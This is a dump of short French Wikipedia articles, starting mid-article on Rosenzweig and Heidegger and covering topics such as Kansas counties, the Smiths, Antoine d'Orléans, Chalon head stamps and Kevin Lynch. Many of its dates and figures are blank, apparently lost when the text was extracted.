"L'Étoile de la Rédemption" a eu beaucoup d'influence sur Martin Heidegger, notamment dans son essai "Sein und Zeit" ("Être et Temps"), paru en 1927.
« Avant Heidegger, Rosenzweig a compris le temps non comme une forme préexistante dans laquelle les événements viendraient se loger, mais comme une modalité spécifique de l’être-là de l’homme. Les trois temps qui, dans "L’Étoile", articulent l’ordre de l’existence, préfigurent les trois ek-stases temporelles de "Sein und Zeit" », selon Emilio Britto.
Toutefois, la pensée de Rosenzweig diffère radicalement de celle de Heidegger. Le contraste se marque d’emblée dans la façon de comprendre les trois notions fondamentales : Dieu, le monde, l'homme.
« Le Dasein de Sein und Zeit s’enferme dans la résolution à soi-même, tandis que, pour Rosenzweig, « l’être » n’est pas en définitive mon être, mais « son être » (l’être de l’Eternel) », selon Britto. « Pour Heidegger, le monde est un « existential », au moment où se structure le Dasein ; en revanche, Rosenzweig comprend le monde dans l’ordre de la création ».
Tous les autres contrastes entre Rosenzweig et Heidegger dérivent de ces divergences fondamentales : du côté de Heidegger, « on trouve le « projet jeté », la « liberté pour la mort », « l’être présent pour son temps », la thèse de « je suis moi-même le temps », la vérité de « chaque fois » ; du côté de Rosenzweig, « on rencontre la Création et la Révélation, la certitude de la vie éternelle, la disponibilité constante pour la venue du Royaume, la thèse que Dieu s’étend de l’éternité à l’éternité, la vérité éternelle ».
Rosenzweig et Levinas.
Emmanuel Levinas a signalé l’importance de Rosenzweig dans la formation de sa propre pensée mais il ne l’a guère commentée. En 1959, il prononce une conférence intitulée "Entre deux mondes" (La voie de Franz Rosenzweig), biographie spirituelle.
L’influence de Rosenzweig sur Levinas tient surtout à la conception du « totalitarisme comme une propriété, non du politique, mais de l’être », selon Bernard-Henri Lévy.

</doc>
<doc id="1872973" url="https://fr.wikipedia.org/wiki?curid=1872973" title="Reverchon Industries France">
Reverchon Industries France



</doc>
<doc id="1872977" url="https://fr.wikipedia.org/wiki?curid=1872977" title="American Kennel Club">
American Kennel Club

LAmerican Kennel Club (AKC) est la plus importante fédération canine des États-Unis. 
Fondée en 1884, sa mission principale est la promotion et l’amélioration du cheptel des races canines.
Groupes de races.
Les races de chiens reconnues par l'AKC sont divisées en sept catégories :
En plus de ces sept groupes, il y a également le "Foundation Stock Service", qui contient des races en attente d'une éventuelle reconnaissance. En son sein, il y a le sous-groupe de la "Miscellaneous Class", à savoir des chiens non reconnus par l'AKC mais qui sont autorisés à participer à des expositions.

</doc>
<doc id="1872978" url="https://fr.wikipedia.org/wiki?curid=1872978" title="Zdnet.fr">
Zdnet.fr



</doc>
<doc id="1872981" url="https://fr.wikipedia.org/wiki?curid=1872981" title="Comté de Clay (Kansas)">
Comté de Clay (Kansas)

Le comté de Clay est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 20 février 1857, il a été nommé en hommage au politicien Henry Clay.
Siège et plus grande ville : Clay Center.

</doc>
<doc id="1872982" url="https://fr.wikipedia.org/wiki?curid=1872982" title="AKC">
AKC

AKC peut faire référence à :

</doc>
<doc id="1872985" url="https://fr.wikipedia.org/wiki?curid=1872985" title="Real Brothas">
Real Brothas

Real Brothas est un album collaboratif de B.G. Knocc Out et Dresta, sorti le .
L'album s'est classé au Heatseekers, au Top R&amp;B/Hip-Hop Albums et au Billboard 200.
Les titres "Jealousy" et "D.P.G/K" ont été écrits en réponse aux attaques du groupe Tha Dogg Pound et "50/50 Luv" en hommage à Eazy-E décédé le .

</doc>
<doc id="1872993" url="https://fr.wikipedia.org/wiki?curid=1872993" title="Europe 2 tv">
Europe 2 tv



</doc>
<doc id="1872999" url="https://fr.wikipedia.org/wiki?curid=1872999" title="Tobiko">
Tobiko

 est le mot japonais pour les œufs de poisson volant.
Ces œufs sont petits, allant de à . Les "tobiko" sont plus grands que les œufs d'éperlan ("masago") et plus petits que les œufs de saumon ("ikura").
Les "tobiko" ont une couleur rouge-orangée mais on les trouve parfois parfumés au "wasabi" (vert), au gingembre (orange) ou à l'encre de calmar (noir).
Préparés en sashimi, ils peuvent être présentés sur des moitiés ou des quartiers d'avocat.

</doc>
<doc id="1873006" url="https://fr.wikipedia.org/wiki?curid=1873006" title="Culture des perles">
Culture des perles



</doc>
<doc id="1873013" url="https://fr.wikipedia.org/wiki?curid=1873013" title="Bigmouth Strikes Again">
Bigmouth Strikes Again

Bigmouth Strikes Again est une chanson de The Smiths, sortie en 1986, sur leur troisième album "The Queen Is Dead". Single le mieux classé de cet album, elle atteignit l'année de sa sortie la dans les "charts" britanniques. Elle figure également comme chanson de fermeture sur le seul album live des Smiths, "Rank", sorti en 1988.
La chanson contient une référence humoristique à Jeanne d'Arc.
La voix aiguë que l'on entend en arrière-plan, créditée comme étant celle d'une certaine « Ann Coates », est en réalité celle de Morrissey. Ce nom fait référence à Ancoats, district de Manchester duquel le groupe est originaire.
Depuis la séparation des Smiths, Morrissey continue d'interpréter cette chanson en concert, remplaçant depuis le début des années 2000 le mot "walkman" par le mot "iPod". Elle apparaît sous cette forme sur son album live, "Live at Earls Court", sorti en 2005.
La chanson a été reprise par Placebo qui, dans sa version, remplace le mot "walkman" par le mot "discman" et l'expression "hearing aid" (prothèse auditive) par le mot "megadrive". Elle figure sur une face B de "Nancy Boy", sur le disque 2 de l'édition spéciale de "Sleeping with Ghosts" et aussi sur la compilation hommage "The Smiths Is Dead". "Bigmouth Strikes Again" a aussi été reprise par les groupes Treepeople, The Entertainment System et Slapshot. 
Elle est également reprise et traduite sous le titre "Batyar" par The Ukrainians, sur leur EP de reprises de "The Smiths" en 1992, "Pisni iz The Smiths".
Gravures sur vinyle.
Single et maxi single : BEWARE THE WRATH TO COME / TALENT BORROWS, GENIUS STEALS
La gravure sur la face A est tirée d'une banderole qui apparaît dans le film "Hobson's Choice", l'un des films préférés de Morrissey. La gravure sur la face B est une citation d'Oscar Wilde.
Artwork.
Photographies de James Dean par Nelva Jean Thomas.

</doc>
<doc id="1873017" url="https://fr.wikipedia.org/wiki?curid=1873017" title="Tomislav Ivkovic">
Tomislav Ivkovic



</doc>
<doc id="1873019" url="https://fr.wikipedia.org/wiki?curid=1873019" title="Antoine d'Orléans (1866-1930)">
Antoine d'Orléans (1866-1930)

Antoine Marie Louis Philippe Jean Florent d'Orléans, infant d’Espagne et quatrième duc de Galliera (en Italie) est né à Séville le et mort à Neuilly-sur-Seine le . C’est un membre de la famille royale espagnole et un petit-fils du roi des Français Louis-Philippe.
Famille.
Antoine d’Orléans est le seul fils survivant du prince français Antoine d'Orléans, duc de Montpensier, et de son épouse l'infante espagnole Louise Fernande de Bourbon (1832-1897). Par son père, il est le petit-fils du roi des Français Louis-Philippe (1773-1850) et de son épouse Marie-Amélie de Bourbon (1782-1866), princesse des Deux-Siciles. Par sa mère, il est également le petit-fils de deux autres souverains : le roi Ferdinand VII d’Espagne (1784-1833) et sa femme la reine Marie-Christine de Bourbon (1806-1878), princesse des Deux-Siciles.
Le , le prince épouse à Madrid sa cousine germaine l'infante espagnole Eulalie de Bourbon (1864-1958), elle-même fille de la reine Isabelle II d’Espagne (1830-1904) et de son époux le roi-consort François d'Assise de Bourbon (1822-1902), duc de Cadix. Du fait de ce mariage, Antoine d’Orléans devient une seconde fois le beau-frère d’Alphonse XII d’Espagne, qui l’était déjà en tant qu’époux de Mercedes d’Orléans (1860-1878), sœur d’Antoine.
Du mariage d’Antoine et d’Eulalie naissent trois enfants :
Biographie.
Antoine d’Orléans naît à Séville, peu avant la fin du règne de sa tante la reine Isabelle II, mais il passe une bonne partie de son enfance à l’étranger, du fait de la révolution de 1868 qui chasse sa famille d’Espagne. Pourtant, son père, l’ambitieux et libéral duc de Montpensier, n’est pas sans lien avec les révolutionnaires qui le poussent à quitter son pays d’adoption : c’est en effet avec son argent que le soulèvement a été préparé et il espère bien être élu roi en guise de remerciement. Cependant, la tentative est un échec et le bannissement des Orléans est confirmé par le gouvernement provisoire espagnol.
En décembre 1874, le coup d'État du général Arsenio Martínez Campos permet la restauration de la monarchie espagnole et le jeune Alphonse XII est proclamé souverain (à la suite de la renonciation de sa mère). Quelques mois après, les Orléans sont pardonnés et Antoine retourne vivre avec sa famille à Séville, au palais de San Telmo. En 1878, la réconciliation des Orléans et des Bourbon espagnols est même totale puisque le roi Alphonse XII épouse l’une des sœurs aînées d’Antoine, la princesse Mercedes d’Orléans (1860-1878).
En 1886, Antoine d'Orléans épouse à son tour l’une des sœurs d’Alphonse XII, l’infante Eulalie d’Espagne (1864-1958). Mais le prince est volage et dépensier tandis que son épouse est une femme forte et cultivée, qui refuse de supporter les humiliations que lui fait subir son époux. C’est la raison pour laquelle le couple se sépare, puis divorce, peu après la naissance de son troisième enfant.
L'union d'Antoine avec la sœur du roi lui donne tout de même l’occasion de jouer un certain rôle officiel à la Cour de Madrid. En 1892, le prince participe ainsi au voyage de son épouse à Cuba et aux États-Unis, à l’occasion de la commémoration du quadricentenaire de la « découverte » de l’Amérique par Christophe Colomb. 
En 1895, le roi d'Italie, Humbert, relève le titre de duc de Galliera en faveur d’Antoine d’Orléans. L’héritier légitime du titre, Philippe de La Renotière von Ferrary (1850-1917), refuse en effet de le porter et le prince met en avant les liens de sa famille avec la dernière duchesse de Galliera, Maria Brignole Sale (1812-1888), pour se faire conférer le titre.
En 1900, l’infant d’Espagne rencontre, à l’hôtel Savoy de Londres, Marie-Louise Le Manac’h (1869-1949), veuve de Simon Gugenheim. 
Immédiatement séduit par cette jeune bretonne, le prince entame avec elle une relation amoureuse qui s’étale au grand jour entre Londres, Paris et Séville. Cependant, même avec sa maîtresse, il est incapable de rester fidèle et, en 1906, il finit par se lasser de celle qu’il a peu à peu introduite dans « le grand monde ». Antoine d'Orléans ne sort cependant pas totalement indemne de cette relation car sa maîtresse, furieuse d’être éconduite, lui brise plusieurs dents en le frappant de son ombrelle.
Pendant toutes ces années, le prince mène grand train et dilapide la fortune de sa famille pendant que son ex-femme vit dans une relative pauvreté. Ainsi, en 1919, ses dépenses excessives le contraignent à vendre les terres de son duché italien.
Il meurt dans la pauvreté à Paris, en 1930, et ses restes sont transférés au panthéon des Infants du monastère de l’Escurial.

</doc>
<doc id="1873022" url="https://fr.wikipedia.org/wiki?curid=1873022" title="Laajalahti (baie)">
Laajalahti (baie)

 
Laajalahti est une baie du golfe de Finlande parcourue par la frontière maritime qui sépare les deux villes finlandaises les plus peuplées, c'est-à-dire la capitale Helsinki et sa voisine occidentale, Espoo. La zone est protégée avec la baie Vanhankaupunginlahti en tant que site Ramsar depuis 1974.
Géographie.
Laajalahti est située dans la région d'Uusimaa et donc dans la province de Finlande méridionale. Elle est bordée à l'ouest par Espoo, plus précisément le super-district de Suur-Tapiola et les quartiers d'Otaniemi et Laajalahti.
Au sud-est on trouve deux îles appartenant à la municipalité d'Helsinki : Lehtisaari et Kuusisaari. Enfin, la côte nord-est correspond à la partie centrale du district de Munkkiniemi, toujours à Helsinki.
Laajalahti est séparée de la pleine mer par Koivusaari et Hanasaari, et par le remblai terrestre de la Länsiväylä entre Lauttasaari et le continent du côté d'Espoo.
De Laajalahti, Iso Huopalahti continue vers le nord, qui est séparé de Laajalahti par Tarvo et les remblais de la Turunväylä et leurs ponts.
Du côté est, Laajalahti est séparée de Seurasaarenselka par une chaîne d'îles composée de Kuusisaari, Lehtisaari, Kaskisaari et Lauttasaari.
Le pont de Kuusisaarentie mène de Lehtisaari à Otaniemi du côté d'Espoo.
Sur la rive de la baie Laajalahti se trouvent Munkkiniemi du côté d'Helsinki, du côté d'Espoo le quartier éponyme de Laajalahti, Otaniemi qui dépasse au milieu de la baie et Keilaniemi du côté sud de celle-ci.
Tarvaspää, le musée Akseli Gallen-Kallela et la Villa Elfvik sont situés sur la rive nord de la baie.
Site Natura 2000.
Une partie de la baie sur la rive ouest de la baie, au nord d'Otaniemi, est devenue peu profonde et partiellement transformée en zone humide.
C'est l'une des meilleures eaux ornithologiques de la région de la capitale, où de nombreux oiseaux nichent et où de nombreux oiseaux se reposent également pendant leurs migrations. Une réserve naturelle de 1,8 kilomètre carré a été établie dans la région, qui comprend à la fois des eaux libres et des roselières, des bosquets côtiers et des prairies. Les oiseaux peuvent être observés depuis les tours d'observation des oiseaux érigées dans la zone.
La zone Natura 2000 (FI0100028) de Laajalahti comprend la baie marine peu profonde, large et remplie de roseaux de 192 hectares.
En plus de la zone d'eau libre et des roselières, elle est bordée de forêts inondables, de végétation de bosquets, d'anciens champs et de broussailles.

</doc>
<doc id="1873026" url="https://fr.wikipedia.org/wiki?curid=1873026" title="Capitale européenne">
Capitale européenne

Capitale européenne ou capitale de l'Europe peut faire référence à :

</doc>
<doc id="1873029" url="https://fr.wikipedia.org/wiki?curid=1873029" title="Comté de Cherokee (Kansas)">
Comté de Cherokee (Kansas)

Le comté de Cherokee est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec le Missouri et l’Oklahoma. Il a été fondé le 18 février 1860.
Siège : Columbus. Plus grande ville : Baxter Springs.

</doc>
<doc id="1873034" url="https://fr.wikipedia.org/wiki?curid=1873034" title="Rivea corymbosa">
Rivea corymbosa



</doc>
<doc id="1873036" url="https://fr.wikipedia.org/wiki?curid=1873036" title="Antoine d'Orléans-Bragance (1950)">
Antoine d'Orléans-Bragance (1950)



</doc>
<doc id="1873038" url="https://fr.wikipedia.org/wiki?curid=1873038" title="Tello">
Tello

Tello est un nom propre qui peut faire référence à :
Prénom.
Tello est un prénom espagnol notamment porté par :

</doc>
<doc id="1873039" url="https://fr.wikipedia.org/wiki?curid=1873039" title="Éléonore de Grandmaison">
Éléonore de Grandmaison

Éléonore de Grandmaison (née vers 1620 à Clamecy, France, morte le à Québec, Canada), nièce de la duchesse d'Aiguillon, fut un personnage historique d'importance en Nouvelle-France. Elle fut à la fois, seigneuresse, femme d'affaires avertie, épouse active et elle a laissé une très nombreuse descendance, tant en France, qu'en Amérique. 
Les jalons d'une vie bien remplie.
Mariée avant 1639 à Antoine Bourdier de Beauregard, Éléonore de Grandmaison deviendra très tôt veuve de ce premier mari puisqu'elle débarque à Québec en 1641
avec son deuxième mari, François de Chavigny de Berchereau, originaire de Créancey en Champagne. Elle a à ce moment environ 19 ans. Avant son départ pour le Canada, François de Chavigny s'était fait donner par la Compagnie de la Nouvelle-France deux arpents de terre dans la ville de Québec, trente arpents de terre hors la banlieue de Québec et une seigneurie d'une demi-lieue de largeur sur trois lieux de profondeur. Une lieue équivalait alors à environ 3.5 kilomètres. Cette seigneurie était située le long du littoral nord du fleuve Saint-Laurent, où est située aujourd'hui la municipalité de Deschambault-Grondines, entre les villes de Québec et Trois-Rivières.
Les époux Chavigny de Berchereau choisissent d'abord de s'établir à Sillery où ils résideront quatre années. En 1645 ils se décident à aller vivre dans leur seigneurie de Chavigny à Deschambault où ils resteront trois années. Le "Journal des Jésuites" mentionne que des missionnaires se rendaient à la seigneurie « pour donner les secours de la religion » à la famille Chavigny.
Mais en 1648, devant les dangers que représentaient les Iroquois qui au cours de l'été avaient effectué plusieurs attaques dans les environs de Trois-Rivières, Éléonore de Grandmaison, son époux François de Chavigny et leurs quatre enfants jugent préférable de s'établir en des lieux plus sûrs. Ils choisissent l'Île d'Orléans. 
Ils obtiennent, en mars 1649, une seigneurie de quarante arpents de front sur toute la largeur de l'Île, sur la pointe ouest de l'Île d'Orléans, face à Québec. C'est ce fief ou seigneurie qui quelques années plus tard prendra le nom de fief de Beaulieu, à l'endroit même où se situe aujourd'hui, le Village de Sainte-Pétronille.
François de Chavigny résidera peu dans sa seigneurie de l'Île d'Orléans puisqu'en 1651, en raison de graves problèmes de santé, il retourne en France. Il semble qu'il mourut en mer au cours de ce voyage.
Veuve avec six enfants à charge, Éléonore de Grandmaison, convolera en troisièmes noces, en août 1652, cette fois avec Jacques Gourdeau sieur de Beaulieu qui donnera son nom au fief susnommé. C'est le Père Chaumonot qui célébra ce mariage, qui semble-t-il, fut le tout premier sur l'Île d'Orléans.
Jacques Gourdeau de Beaulieu eut une fin tragique : il fut tué par un de ses valets, dans sa maison de l'Île d'Orléans, dans la nuit du . De nouveau Éléonore de Grandmaison se retrouva veuve avec une nombreuse progéniture : le couple avait eu quatre enfants.
Enfin, en quatrièmes noces, à Québec, le , moins de cinq mois après la mort de Jacques Gourdeau de Beaulieu, Éléonore de Grandmaison unissait sa destinée à un important personnage de la colonie, Jacques de Cailhaut de La Tesserie. Monsieur de la Tesserie, raconte la chronique, fut un véritable père pour les enfants du deuxième et du troisième mariage de sa femme.
Il décéda à Québec le et fut inhumé dans l'église paroissiale. Il n'était âgé que de 44 ans.
Quant à Éléonore de Grandmaison, elle rendit l'âme le , près de 20 ans après son dernier mari. Elle fut inhumée au cimetière paroissial de Québec. Elle était âgée de 70 ans.
Hommages.
Une rue a été nommée en son honneur, en 1986, dans la ville de Québec.

</doc>
<doc id="1873044" url="https://fr.wikipedia.org/wiki?curid=1873044" title="Humbert Ier d’Italie">
Humbert Ier d’Italie



</doc>
<doc id="1873045" url="https://fr.wikipedia.org/wiki?curid=1873045" title="Future Sound of London">
Future Sound of London



</doc>
<doc id="1873048" url="https://fr.wikipedia.org/wiki?curid=1873048" title="Aéroport d'Eindhoven">
Aéroport d'Eindhoven

L'aéroport d'Eindhoven est un aéroport régional situé près d'Eindhoven (Pays-Bas). En nombre de passagers, c'est le deuxième aéroport du pays avec passagers traités en 2014, juste devant celui de Rotterdam, mais loin derrière Schiphol, l'aéroport majeur des Pays-Bas, avec plus de de passagers.
L'aéroport d'Eindhoven est à usage civil et militaire abritant la flotte d'avions de transport de la force aérienne royale néerlandaise. De la Seconde Guerre mondiale jusqu'à il y quelques années, l'aéroport était appelé Welschap. Il est ravitaillé en carburant aviation par le réseau d'oléoducs en Centre-Europe.
Dans les années 1990, il accueille cinq éditions du Dynamo Open Air, à l'époque le plus important festival de metal en Europe.

</doc>
<doc id="1873052" url="https://fr.wikipedia.org/wiki?curid=1873052" title="Effigie Chalon">
Effigie Chalon

L’effigie Chalon ("Chalon head") est le nom donné aux séries de timbres-poste illustrées d'un portrait de la reine Victoria, créé à partir d'une peinture d'Alfred Edward Chalon (né vers 1780 à Genève et mort en 1860 à Londres).
Ces timbres, réalisés à New York pour les colonies canadiennes, puis par l'imprimerie Perkins, Bacon and Company de Londres, sont en usage dans plusieurs colonies britanniques des années 1850 jusqu'en 1912 au Queensland. Les colonies concernées sont, dans l'ordre chronologique : la province du Canada en 1851, la Nouvelle-Écosse en 1853, la Tasmanie et la Nouvelle-Zélande en 1855, les Bahamas et le Natal en 1859, Grenade, le Nouveau-Brunswick et le Queensland en 1860, et en 1870 l'île du Prince-Édouard.
Ces séries sont parfois les premiers timbres-poste portant le nom de ces colonies et sont donc l'objet d'études et collections philatéliques classiques.
Description.
Le portrait originel.
L'effigie est extraite d'un portrait effectué par Alfred Edward Chalon à l'occasion de la première apparition publique de la reine, lors du discours devant la Chambre des lords de prorogation du Parlement, en . Victoria commande le tableau pour l'offrir à sa mère, Victoire.
Portant le diadème d'État du couronnement de George IV de 1820, elle est vêtue d'une robe et d'un long manteau royal. Elle se tient le corps tourné vers la droite en direction de marches. Sa main gauche est posée sur le socle d'une colonne, sur lequel est sculpté un lion. Le visage est tourné vers la gauche.
Ce portrait est également connu comme le « portrait du couronnement » car une reproduction à partir d'une gravure de Samuel Cousins en a été distribuée au public, le .
Les timbres.
Sur les timbres de petit format, l'effigie est représentée dans un ovale, qui prend deux principales formes : soit un ovale large qui permet de voir le collier sur le bas du cou de la reine Victoria, soit un ovale moins large qui cache ce bijou.
En Nouvelle-Zélande, le cercle est suffisamment grand pour que la robe et le haut du manteau royal soient visibles.
Histoire.
Canada.
En 1851, c'est la colonie britannique du Canada-Uni (approximativement l'Ontario et le Québec actuels) qui utilise l'effigie "Chalon" sur ses premiers timbres. Le , l'effigie "Chalon" apparaît sur deux des six premiers timbres : le 7 pence et demi vert et le 12 pence noir. Le portrait est placé dans un ovale dans lequel sont inscrites les mentions « CANADA POSTAGE » et la valeur faciale en lettres. Il est réutilisé en sur le 12 cents et demi, pour la première émission en dollar canadien ; sa contre-valeur est indiquée en lettres : « SIX PENCE STERLING ». Comme les autres timbres des séries auxquelles ils appartiennent, les "Chalon" sont commandés à des imprimeurs new-yorkais : Rawdon, Wright, Hatch et Edson, unis dans l' lors de la série de 1859.
Trois autres provinces' ayant émis des timbres-poste avant leur adhésion à la Confédération canadienne, ont connu des timbres à cette effigie : la Nouvelle-Écosse en (une valeur inscrite dans un carré posé sur la pointe, imprimée par Perkins, Bacon &amp; Co), le Nouveau-Brunswick en (trois valeurs imprimées à New York par l') et l'Île-du-Prince-Édouard en (une valeur). Seul, ce dernier est imprimé dans une colonie canadienne, par la .
Au temps de la Confédération, pour le soixantième anniversaire du règne de la reine Victoria en 1897, l'effigie "Chalon" apparaît sur une série commémorative de grand format avec un second profil, plus âgé, d'après un portrait de Heinrich von Angeli de 1886. Émise le , cette série de seize timbres d'un demi-cent à cinq dollars provoque des critiques : seulement timbres d'un demi-cent et pour le six cents sont imprimés en raison d'un manque d'usage possible. Mais, face à la menace d'une spéculation, la poste canadienne ne vend ces deux valeurs que si l'acheteur se procure pour la série entière, dont deux unités dépassent le tarif maximum de l'époque ().
Nouvelle-Zélande.
En Nouvelle-Zélande, l'effigie "Chalon" illustre les premiers timbres du pays de 1855 à 1873, Victoria restant elle-même l'unique sujet de ces figurines jusqu'à la série des paysages de 1898. L'effigie est placé dans un cercle de diamètre suffisamment grand pour voir le haut de la robe royale. En philatélie néo-zélandaise, l'émission est également appelée « "Full Face" » puisque la reine est de face alors que la plupart des timbres depuis 1840 la représentent de profil.
Si les premiers timbres de 1 penny et 2 pence de 1855 sont imprimés à Londres par Perkins, Bacon and Company, dès 1856, ce sont des imprimeurs d'Auckland qui réalise les nouvelles émissions : J. Richardson, puis John Davis en 1862.
La dentelure apparaît à la fin des années 1850, mais ne concernent pas tous les timbres, et peut prendre plusieurs formes (points, lignes ou perforations). À cause d'une pénurie de papier au filigrane d'une étoile à six branches, le filigrane « NZ » distingue les timbres de 1864.
Tasmanie.
La Terre de van Diemen sur sa seconde émission de 1855 sous ce nom, puis à partir de 1858 à 1870 sous le nom de Tasmanie, emploie le portrait d'après Chalon gravé par W. Humphrys.
L'imprimeur britannique Perkins Bacon crée trois ornements autour de l'effigie en 1855, 1857 et 1858 qui servent jusqu'en 1870. Les plaques d'impression sont envoyées en Tasmanie où différents imprimeurs locaux, puis l'imprimerie du gouvernement après 1864, réalisent des réimpressions.
Bahamas.
En , pour remplacer les timbres britanniques, le gouverneur des Bahamas, Charles John Bayley, demande la réalisation d'un timbre pour le courrier intérieur, circulant entre les îles de l'archipel. Dans son courrier, il soumet le dessin d'un timbre rond dont le cercle extérieur porte les mentions et le rond central deux des principales productions de la colonie : un fruit d'ananas sur son pied et une conque. Cependant, l'imprimerie Perkins, Bacon and Company juge qu'un tel timbre serait trop difficile à imprimer et à denteler.
Le projet se dirige alors vers la gravure de l'effigie de la reine d'après le portrait de Chalon. À la demande du gouverneur, les deux productions bahaméennes sont ajoutées : l'ovale de l'effigie s'en trouvant réduit, le collier porté par Victoria n'est pas visible sur le 1 penny carmin. Sous le nom « BAHAMAS » horizontal, une banderole indique l'usage de cette valeur : « INTERINSULAR POSTAGE » pour « port entre île ». La première livraison de timbres imprimés à Londres est mise en vente aux Bahamas le . À partir de , ils sont dentelés, mais les perforations ne sont au point qu'après 1863, à raison de 14 trous aux deux centimètres.
Pour remplacer les timbres du Royaume-Uni sur le courrier à destination de l'Amérique du Nord et de la métropole, deux nouvelles valeurs sont émises en : un quatre pence rose et un six pence gris. Sur celles-ci, les deux médaillons de l'ananas et de la conque sont omis et le collier de la reine est désormais visible.
Queensland.
Lorsqu'il se sépare de la Nouvelle-Galles du Sud, le Queensland émet ses premiers timbres au type "Chalon" en 1860 et les remplace en 1880. Néanmoins, lorsqu'il est décidé de créer de fortes valeurs faciales (de 2 shillings à une livre), l'effigie est reprise en 1882 dans un timbre plus grand, imprimé en taille-douce ou en lithographie, et sert jusqu'à l'émission des timbres d'Australie, en 1912.
Natal.
En 1859, le Natal, colonie du sud de l'Afrique, remplace ses timbres-poste imprimés en relief et à sec par l'effigie "Chalon" qui est utilisé jusqu'en 1867.
Grenade.
Grenade a utilisé deux illustrations différentes du type "Chalon" pour ses premiers timbres-poste.
En 1859, l'illustration s'inspire désormais de graphisme utilisé pour d'autres colonies (nom de la colonie et valeur en lettres inscrite horizontalement sur un fond de couleur uni, respectivement en haut et en bas du timbre). Le collier est visible. En 1875, le médaillon est réduit au diamètre d'un petit cercle qui laisse seulement voir le visage de la reine. En 1883, le type est remplacé.
Collection et études.
Les timbres à l'effigie inspirée de la peinture de Chalon sont les tout-premiers ou parmi les premiers timbres de ces colonies. Leur collection est donc développée dans le cadre de la philatélie classique et de l'histoire postale du .
Pour les "Chalon" de Bahamas, Louis Bradbury, trésorier de la Royal Philatelic Society London (RPSL) de 1927 à 1945, est réputé pour sa collection de timbres de cette colonie, mais également de documents et de correspondance entre les services gouvernementaux britanniques et l'imprimeur Perkins Bacon. À sa mort, en 1950, sa collection est léguée à la RPSL.
Ces timbres à l'état neuf et en bon état appartiennent aux timbres les plus cotés de la philatélie coloniale britannique. En , lors de la dispersion de la collection de l'industriel Gawaine Baillie, un 12 pence noir du Canada-Uni, peu acheté à l'époque à cause de sa forte valeur, est vendu sterling, et un "Chalon" de Nouvelle-Zélande atteint pour une impression de Londres.

</doc>
<doc id="1873053" url="https://fr.wikipedia.org/wiki?curid=1873053" title="Zlatko Vujovic">
Zlatko Vujovic



</doc>
<doc id="1873054" url="https://fr.wikipedia.org/wiki?curid=1873054" title="Comté de Hudspeth">
Comté de Hudspeth

Le comté de Hudspeth, en "", est un comté situé dans l'ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la census-designated place de Sierra Blanca. Selon le recensement des États-Unis de 2020, sa population est de . Il est nommé en l'honneur de Claude Benton Hudspeth, un membre du Sénat du Texas.
Organisation du comté.
Le comté est créé le , à partir de terres du comté d'El Paso. Il est définitivement organisé et autonome, à la fin de l'année 1917. 
Initialement, le comté était nommé comté de Darlington puis comté de Turney. Il est finalement baptisé, sous son nom actuel, en référence à Claude Benton Hudspeth, sénateur du Texas à El Paso.
Géographie.
Le comté a une superficie de totale de , composée de de terres et de de zones aquatiques. 
Le fleuve Río Grande forme la frontière avec l'État de Chihuahua au Mexique.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . Elle est estimée, en 2017, à .
Selon l""', en 2010, 76,49 % de la population âgée de plus de déclare parler l’espagnol à la maison, 22,10 % déclare parler l'anglais, 0,69 %, le gujarati et 0,72 % une autre langue.

</doc>
<doc id="1873058" url="https://fr.wikipedia.org/wiki?curid=1873058" title="Fahudin Omerović">
Fahudin Omerović



</doc>
<doc id="1873060" url="https://fr.wikipedia.org/wiki?curid=1873060" title="Trou de Bozouls">
Trou de Bozouls

Le Trou de Bozouls est une gorge en forme de fer à cheval, parcourue par la rivière Dourdou et située sur le territoire de la commune de Bozouls, dans le département français de l'Aveyron. Le bourg occupe les deux rives du méandre.
Géologie.
Ce méandre encaissé a été creusé par l'action érosive des eaux courantes du Dourdou dans les calcaires secondaires du Lias du Causse Comtal. Il s'agit d'un canyon et d'une reculée karstique (échancrure s’enfonçant dans le massif calcaire, en recul par rapport à la ligne de la falaise et soumise à l’érosion chimique de l’eau). Le "cirque" fait près de 400 m de diamètre et près de 100 m de profondeur.
Histoire.
Vers le IXe siècle, un premier village, et son château qui a appartenu au comtes de Rodez, ont été érigés sur l'éperon rocheux au centre du méandre, accessible par le sud.
Les siècles suivants, des maisons furent construites vers la rive droite du Dourdou, à proximité de deux tours, puis en haut et bordure de la falaise constituant le canyon. La forteresse a disparu, mais on appelle toujours "le château", le site du vieux village subsistant au centre du méandre, avec son église romane Sainte-Fauste du XIIe siècle.
Environnement.
Le canyon de Bozouls a été autrefois inscrit parmi les sept merveilles du Rouergue.
Le site est protégé en tant qu'espace naturel sensible.
La commune a obtenu, en 2018, 2 fleurs du label "Villes et villages fleuris""."
Activités.
Le funambule Henry's en a fait le théâtre de certains de ses exploits, en 1980, durant l'été 1982, puis en 1995.
Depuis 2010, le Comité des Jeunes de Bozouls organise la "Festa del Traouc", un festival de musiques actuelles au sommet du site géologique.

</doc>
<doc id="1873061" url="https://fr.wikipedia.org/wiki?curid=1873061" title="Loveridge">
Loveridge

Le nom de Loveridge est porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="1873062" url="https://fr.wikipedia.org/wiki?curid=1873062" title="Fahrudin Omerovic">
Fahrudin Omerovic



</doc>
<doc id="1873067" url="https://fr.wikipedia.org/wiki?curid=1873067" title="Kevin Lynch (urbaniste)">
Kevin Lynch (urbaniste)

Kevin Andrew Lynch est un urbaniste, architecte et enseignant américain né le à Chicago (Illinois) et mort le à Martha's Vineyard (Massachusetts). Son livre le plus connu est "L'Image de la cité" () publié en 1960 aux États-Unis et traduit en 1969 en français.
Biographie.
Kevin Lynch a étudié à l'université Yale (1935-1937), auprès de Frank Lloyd Wright à Taliesin (1937-1939), à l'Institut polytechnique Rensselaer (1939-1940) et au MIT, où il obtient un baccalauréat universitaire en urbanisme () en 1947.
Il y enseigne à partir de 1948, devenant en 1949, puis en 1955 et enfin professeur en 1963. En 1978, il prend sa retraite et fonde avec Stephen Carr la firme .
Lynch a fourni au cours de sa carrière des contributions majeures dans le domaine du développement urbain par la recherche empirique sur la façon dont les individus perçoivent et naviguent dans le paysage urbain. Ses livres explorent la présence du temps et de l'histoire dans l'environnement urbain, comment les environnements urbains touchent les enfants, et comment tirer parti de la perception humaine de la forme physique des villes et des régions comme base conceptuelle d'une bonne conception urbaine.
Kevin Lynch meurt en 1984 dans sa maison de vacances de Martha's Vineyard.
"L'image de la cité".
